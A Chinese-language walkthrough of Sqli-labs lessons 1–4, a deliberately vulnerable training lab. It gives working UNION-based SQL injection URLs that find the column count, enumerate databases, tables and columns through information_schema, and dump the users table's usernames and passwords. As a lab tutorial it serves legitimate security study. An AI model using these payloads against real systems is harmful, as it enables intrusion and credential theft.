
# Sqli-labs-less1
![image.png](_img/assets/1654503299810-ad584fb6-2466-4a89-b2d1-3cb0d356cf67.png)
**查看是否存在注入**<br />http://www.web.com/sql/Less-1/?id=1<br />http://www.web.com/sql/Less-1/?id=1'<br />http://www.web.com/sql/Less-1/?id=1'--+<br />当我们使用?id=1'时报错，说明存在注入点
![image.png](_img/assets/1654503299766-63948164-2518-4337-aec3-735716cef5f9.png)

**使用order by 查看字段数量**<br />使用order by 3 没有报错 使用order by 4 发生报错，说明字段数为3<br />http://www.web.com/sql/Less-1/?id=1' order by 3--+
![image.png](_img/assets/1654503299782-fbd5ef31-f038-4ea7-a3e1-30f43842c923.png)

**查看哪些数据可以回显**<br />将?id=1改为?id=-1 或者其它不存在的值，使用union注入 且通过order by结果为3 可以得到union select 1,2,3<br />http://www.web.com/sql/Less-1/?id=-1' union select 1,2,3--+<br />我们看到数据2,3发生回显
![image.png](_img/assets/1654503299785-1c356b91-14eb-4f3e-818f-7ccba744d2c7.png)

**查看当前版本和数据库**<br />http://www.web.com/sql/Less-1/?id=-1' union select 1,version(),database()--+
![image.png](_img/assets/1654503299823-2efee71b-0e90-4227-b7fc-6764144a0db5.png)

**查看数据库**<br />http://www.web.com/sql/Less-1/?id=-1' union select 1,2,schema_name from information_schema.schemata--+<br />可使用 limit 来改变查询结果<br />http://www.web.com/sql/Less-1/?id=-1' union select 1,2,schema_name from information_schema.schemata limit 1,1--+
![image.png](_img/assets/1654503300569-cd95cdca-2e2d-46f6-baef-04696c1b426e.png)

使用limit也不太方便，这里补充一个函数group_concat()将查询的字段数合并一起输出<br />http://www.web.com/sql/Less-1/?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
![image.png](_img/assets/1654503300589-1430ea90-b3b2-4a85-87f7-cbd3a233eabb.png)
这里我们已经查询到security数据库

**继续查询security库里面的表**<br />http://www.web.com/sql/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
![image.png](_img/assets/1654503300577-0b7ca330-d5f2-4e5c-8f91-0beb423426fc.png)
这里我们已经查询到users表

**继续查询users表里面的字段**<br />http://www.web.com/sql/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
![image.png](_img/assets/1654503300859-43f3220e-9aa6-4ebe-a59b-0e39d4521bf6.png)
这里我们已经查询到username 和password字段

**继续查询username 和password**<br />http://www.web.com/sql/Less-1/?id=-1' union select 1,2,group_concat(username,password) from security.users--+
![image.png](_img/assets/1654503300842-4a0229d6-8771-407a-9ea8-5c4963fb803d.png)
在这里username和password是连接在一起的，我们引入一个函数concat_ws('a',b,c)，他会将b和c之间用a分割<br />http://www.web.com/sql/Less-1/?id=-1' union select 1,2,group_concat(concat_ws('-',username,password)) from security.users--+
![image.png](_img/assets/1654503302525-fad9df4c-4872-46d8-b2e3-cb4e06efff2d.png)
到此我们就已经拿到所有的用户账号和密码。


# Sqli-labs-less-2
![image.png](_img/assets/1654503397651-571a876b-6506-4723-94dd-9906bb0950ca.png)
**查看是否存在注入**<br />当我们使用?id=1'时报错，显示多了一个`'`因此得出这一关可直接使用?id=1 来进行注入攻击<br />http://www.web.com/sql/Less-2/?id=1<br />http://www.web.com/sql/Less-2/?id=1'
![image.png](_img/assets/1654503617991-63e058b5-0c81-452c-89dc-940abaac967d.png)

**使用order by 查看字段数量**<br />使用order by 3 没有报错 使用order by 4 发生报错，说明字段数为3<br />http://www.web.com/sql/Less-2/?id=1 order by 3--+
![image.png](_img/assets/1654503397504-fc7a7548-376a-4230-8393-2cb29bb3deb7.png)
以下步骤与Sqli-labs-Less-1 相同 不进行详细叙述。

注意：<br />在Sqli-labs-Less-1中是?id=1' <br />在Sqli-labs-Less-2中是?id=1


# Sqli-labs-less-3
![](https://img-blog.csdnimg.cn/20200723105441476.png#crop=0&crop=0&crop=1&crop=1&id=rmjED&originHeight=110&originWidth=1017&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**查看是否存在注入**<br />当我们使用?id=1时没有报错<br />http://www.web.com/sql/Less-3/?id=1<br />![](https://img-blog.csdnimg.cn/20200716111058622.png#crop=0&crop=0&crop=1&crop=1&id=vAl07&originHeight=183&originWidth=521&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
当我们使用?id=1’时报错，显示我们此处少了一个）<br />![](https://img-blog.csdnimg.cn/20200716111116912.png#crop=0&crop=0&crop=1&crop=1&id=Fvtew&originHeight=169&originWidth=1255&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
因此得出这一关可直接使用?id=1') 来进行注入攻击

**使用order by 查看字段数量**<br />使用order by 3 没有报错 使用order by 4 发生报错，说明字段数为3<br />http://www.web.com/sql/Less-3/?id=1') order by 3--+<br />![](https://img-blog.csdnimg.cn/20200716111248116.png#crop=0&crop=0&crop=1&crop=1&id=YAi1q&originHeight=176&originWidth=646&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看哪些数据可以回显**<br />将?id=1改为?id=-1 或者其它不存在的值，使用union注入 且通过order by结果为3 可以得到<br />union select 1,2.3<br />http://www.web.com/sql/Less-3/?id=-1') union select 1,2,3--+<br />我们看到数据2,3发生回显<br />![](https://img-blog.csdnimg.cn/20200716111402229.png#crop=0&crop=0&crop=1&crop=1&id=FoEKw&originHeight=186&originWidth=615&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

以下步骤与Sqli-labs-Less-1 相同 不进行详细叙述。<br />注意：<br />在Sqli-labs-Less-1中是?id=1’<br />在Sqli-labs-Less-3中是?id=1')


# Sqli-labs-Less-4
![](https://img-blog.csdnimg.cn/20200723105509991.png#crop=0&crop=0&crop=1&crop=1&id=ZSNGT&originHeight=105&originWidth=1005&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**查看是否存在注入**<br />当我们使用?id=1时没有报错<br />http://www.web.com/sql/Less-4/?id=1<br />![](https://img-blog.csdnimg.cn/20200716111646356.png#crop=0&crop=0&crop=1&crop=1&id=AUx3r&originHeight=172&originWidth=441&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
当我们使用?id=1’时也没有报错<br />![](https://img-blog.csdnimg.cn/20200716111724249.png#crop=0&crop=0&crop=1&crop=1&id=PZa5H&originHeight=169&originWidth=440&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
当我们使用?id=1’)时也没有报错<br />![](https://img-blog.csdnimg.cn/20200716111756441.png#crop=0&crop=0&crop=1&crop=1&id=qhUDJ&originHeight=170&originWidth=428&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
当我们使用?id=1"时报错，并显示我们此处少了一个）<br />![](https://img-blog.csdnimg.cn/20200716111832585.png#crop=0&crop=0&crop=1&crop=1&id=cYmFM&originHeight=147&originWidth=1281&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
因此得出这一关可直接使用?id=1") 来进行注入攻击

**使用order by 查看字段数量**<br />使用order by 3 没有报错 使用order by 4 发生报错，说明字段数为3<br />http://www.web.com/sql/Less-4/?id=1") order by 3--+

**查看哪些数据可以回显**<br />将?id=1改为?id=-1 或者其它不存在的值，使用union注入 且通过order by结果为3 可以得到<br />union select 1,2,3<br />http://www.web.com/sql/Less-4/?id=-1") union select 1,2,3--+<br />我们看到数据2,3发生回显<br />![](https://img-blog.csdnimg.cn/20200716112039340.png#crop=0&crop=0&crop=1&crop=1&id=UmbyF&originHeight=159&originWidth=623&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

以下步骤与Sqli-labs-Less-1 相同不进行详细叙述。<br />注意：<br />在Sqli-labs-Less-1中是?id=1’<br />在Sqli-labs-Less-4中是?id=1")






